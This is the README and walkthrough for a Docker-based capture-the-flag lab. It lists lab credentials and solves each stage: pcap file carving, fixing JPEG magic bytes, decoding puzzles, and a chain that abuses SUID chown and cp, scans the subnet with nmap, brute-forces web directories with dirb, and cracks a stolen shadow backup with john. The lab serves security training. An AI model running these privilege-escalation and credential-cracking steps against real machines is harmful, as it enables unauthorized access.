
kstepxi//sloth333 Challenge 3 - Extended Version


docker-compose up -d --build


Log into the box via ssh localhost:2001 Username alice Password 1234. Read flag.txt for challenge info.


Once flag4 has been found, ssh into localhost:3210 with spike:whateverhappens and continue.













































################################################################################################################
                                                                         
                                  88 88                                  
                                  "" 88                                  
                                     88                                  
,adPPYba, 8b,dPPYba,   ,adPPYba,  88 88  ,adPPYba, 8b,dPPYba, ,adPPYba,  
I8[    "" 88P'    "8a a8"     "8a 88 88 a8P_____88 88P'   "Y8 I8[    ""  
 `"Y8ba,  88       d8 8b       d8 88 88 8PP""""""" 88          `"Y8ba,   
aa    ]8I 88b,   ,a8" "8a,   ,a8" 88 88 "8b,   ,aa 88         aa    ]8I  
`"YbbdP"' 88`YbbdP"'   `"YbbdP"'  88 88  `"Ybbd8"' 88         `"YbbdP"'  
          88                                                             
          88                                                            
#################################################################################################################


1. Account alice:  Copy the secret.pcap file to a computer that has wireshark or another tool that can pull files such as chaosreader from pcaps. scp -P 2001 alice@192.168.1.20:/home/alice/secret.pcap /home
    Determine file type from packet header or magic bytes. Save as filetype and open for username and password. Username:bob Password:)(*&qaz

2. Account bob: Download no_caps_for_user_and_pass.jpg using scp again. Cat the flag file. The file is misssing the magic bytes edit via hex editor add FF D8 FF E0 00 10 4A 46 49 46 00 01. Username:charles Password:zsxnjm!@#

3. Account charles: Utlize find --size or other methods to find the file. Username:danny Password:1234TGB!

4. Account danny: cat flag.txt. Download AES-EBC.txt using scp again. Sort characters into 32 character chunks. Search for repeating 32 characters. Use secret key 1100101011001010 on 2643403ED9101BE30FBB79FB9D02EDC to decode password for edwards password. Username:edward Password:coolbeans&&!!

5. Account edward: This one is just for fun one. Download file and upload file to a site that can transcribe morse code. It's a message encode in hex. Decode to base64 and then to ascii. Username:frank password:mammoth1

6. Bonus frank has a buffer overflow. Challenge get the challenge complete message to show up.






PART 2

Part2

Part2

1.  ssh to ubuntu1, look for flag5
	ex:  ssh spike@localhost -p 3210
2.  flag5 is in /home/root but the directory cannot be listed due to permissions
3.  search for some way to bypass this -- in this case, look for something useful with the suid bit set
	ex: find / -perm /4000
4.  chown seems to have the suid bit and will do what we need
	ex: chown test /home/root
5.  viewing flag5 tells us 172.16.88.87 is listening on 4321.  use nc to connect to ubuntu2, receive ssh creds
	ex: nc 172.16.88.87 4321
	***note: this only works once!  the port will refuse additional connections until the container is restarted
6.  ssh to ubuntu2 and look for flag6.  It is hidden file in /tmp
	ex: ls -R / 2>/dev/null | grep *flag
	    ls -R / 2>/dev/null | grep .*
7.  flag6 has credentials and mentions another box - nmap the subnet
	ex: nmap 172.16.88.0/24
8.  ssh to 172.16.88.99 and look for flag7.  Hint points towards finding a useful script (located in /usr/bin)
	ex: ls /usr/bin
9. Unfortunately, you can't read or execute the script to generate the last flag (flag_write.sh) but maybe
	there is some way to read the script.  Look for useful binaries here
	ex: find / -perm /4000   
10. cp seems to have the suid bit set and can be used to read the script which reveals the contents of flag7!
	ex: LFILE=/usr/bin/flag_write.sh
	    cp "$LFILE" /dev/stdout
11. flag7 says a webserver is accessible through your localhost on port 9331.  when you navigate to the page
	it mentions dirb--maybe something interesting is discoverable using dirb?
	(kali1 has dirb installed and includes a modified default wordlist)
	ex: dirb http://172.16.88.113
12. dirb showed there was a file called "pass" that may be accessible.  try it and see what you get!
	ex: http://localhost:9331/pass
13. the result is some ssh credentials and a tip that ssh is exposed through localhost 9339.
	ex: ssh ein@localhost -p 9339
14. the web server has a hint in ein's home directory telling you that you need root to find the flag.
	poking around the file system will yield the hidden file /tmp/.shadow.bak
	ex: ls -al /tmp
15. looks like it is time to try to crack root's password.  conveniently the kali1 machine has john installed
	(and a modified password.lst file as well).  transfer the file over to the kali1 box and have a go at it
	ex: scp /tmp/.shadow.bak faye@172.16.88.99:/home/faye/shadow
	    john shadow
16. with the root password cracked, time to switch to root and poke around the file system some more.
	flag8 is located in /home/root

Congrats! See you Space Cowboy...




